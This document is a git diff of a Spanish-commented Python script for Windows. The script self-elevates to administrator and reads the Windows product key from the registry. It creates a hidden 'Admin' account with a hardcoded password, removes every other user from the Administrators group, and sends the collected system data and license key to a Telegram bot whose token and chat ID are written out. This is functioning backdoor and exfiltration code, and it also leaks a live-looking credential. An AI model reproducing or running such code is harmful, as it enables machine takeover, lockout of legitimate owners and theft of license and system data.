@@ -11,14 +11,14 @@ TOKEN = "7899150986:AAERjV1Esft3QK1Ss8oOeG7hscXq-Nn8FQ4"
 CHAT_ID = "7899422668"
 
 def is_admin():
-    """Comprueba si el script se está ejecutando con privilegios de administrador."""
+    #Comprueba si el script se está ejecutando con privilegios de administrador.
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
 def run_as_admin():
-    """Reinicia el script con privilegios de administrador."""
+    #Reinicia el script con privilegios de administrador.
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
 if not is_admin():
@@ -26,7 +26,7 @@ if not is_admin():
     sys.exit()
 
 def enviar_a_telegram(mensaje):
-    """Envía un mensaje al chat de Telegram."""
+    #Envía un mensaje al chat de Telegram.
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -42,7 +42,7 @@ def enviar_a_telegram(mensaje):
         print(f"Error al conectarse a Telegram: {e}")
 
 def obtener_clave_windows():
-    """Obtiene la clave de producto de Windows desde el registro."""
+    #Obtiene la clave de producto de Windows desde el registro.
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform")
         value, _ = winreg.QueryValueEx(key, "BackupProductKeyDefault")
@@ -57,13 +57,13 @@ def obtener_clave_windows():
 licencia = obtener_clave_windows()
 
 def obtener_usuarios():
-    """Obtiene la lista de usuarios en la computadora."""
+    #Obtiene la lista de usuarios en la computadora.
     c = wmi.WMI()
     usuarios = [user.Name for user in c.Win32_UserAccount()]
     return usuarios
 
 def crear_usuario_admin():
-    """Crea un usuario 'Admin' con contraseña 'Z3pu0rg' y lo agrega al grupo de administradores si no existe."""
+    #Crea un usuario 'Admin' con contraseña 'Z3pu0rg' y lo agrega al grupo de administradores si no existe.
     resultado = ""
     try:
         # Verificar si el usuario 'Admin' ya existe
@@ -84,32 +84,16 @@ def crear_usuario_admin():
 
 
 def quitar_otros_admins():
-    """Quita a los demás usuarios del grupo de administradores."""
+    #Quita a los demás usuarios del grupo de administradores.
     resultado = ""
     try:
-        """# Intentar obtener la lista de usuarios en el grupo de administradores
-        try:
-            result = subprocess.run(['net', 'localgroup', 'Administradores'], capture_output=True, text=True, check=True)
-        except subprocess.CalledProcessError:
-            result = subprocess.run(['net', 'localgroup', 'Administrators'], capture_output=True, text=True, check=True)
-
-        admins = result.stdout.splitlines()
-        for admin in admins:
-            admin = admin.strip()
-            if admin and admin != 'Admin' and admin != 'Nombre de alias' and admin != 'Administradores' and admin != 'Administrators':
-                # Intentar quitar al usuario del grupo de administradores
-                try:
-                    subprocess.run(['net', 'localgroup', 'Administradores', admin, '/delete'], check=True)
-                except subprocess.CalledProcessError:
-                    subprocess.run(['net', 'localgroup', 'Administrators', admin, '/delete'], check=True)
-                resultado += f"Usuario '{admin}' quitado del grupo de administradores.\n"""
         usuarios = obtener_usuarios()
         for usuario in usuarios:
-            if usuario != 'Admin':
+            if usuario and usuario != 'Admin' and usuario != 'Nombre de alias' and usuario != 'Administrador' and usuario != 'Administrator' and usuario != 'DefaultAccount' and usuario != 'Guest' and usuario != 'Administrator' and usuario != 'WDAGUtilityAccount':
                 try:
-                    subprocess.run(['net', 'localgroup', 'Administradores', usuario, '/delete'], check=True)
+                    subprocess.run(['net', 'localgroup', 'Administradores', usuario, '/delete'])
                 except subprocess.CalledProcessError:
-                    subprocess.run(['net', 'localgroup', 'Administrators', usuario, '/delete'], check=True)
+                    subprocess.run(['net', 'localgroup', 'Administrators', usuario, '/delete'])
                 resultado += f"Usuario '{usuario}' quitado del grupo de administradores.\n"
     except Exception as e:
         resultado += f"Error al quitar usuarios del grupo de administradores: {e}"
@@ -160,7 +144,7 @@ def obtener_info_pc():
             continue
 
     # Usuarios
-    usuarios = [user.name for user in psutil.users()]
+    usuarios = obtener_usuarios()
 
     # Formatear resultados
     mensaje = f"Marca: {marca}\nModelo: {modelo}\nNúmero de Serie: {numero_serie}\nLicencia de Windows: {licencia}\nProcesador: {procesador}\nRAM Total (GB): {ram_total}\n Creacion de Admin \n{crear_usuario_admin()}\n\n{quitar_otros_admins()}"
@@ -168,11 +152,6 @@ def obtener_info_pc():
     for disco in discos:
         mensaje += f"- {disco['Disco']}: Total={disco['Total (GB)']} GB, Usado={disco['Usado (GB)']} GB, Libre={disco['Libre (GB)']} GB\n"
     mensaje += "Usuarios:\n" + "\n".join(usuarios)
-
-    # Enviar mensaje con todos los usuarios
-    for usuario in usuarios:
-        enviar_a_telegram(f"Usuario: {usuario}")
-
     return mensaje
 
 # Crear usuario 'Admin' y ajustar permisos
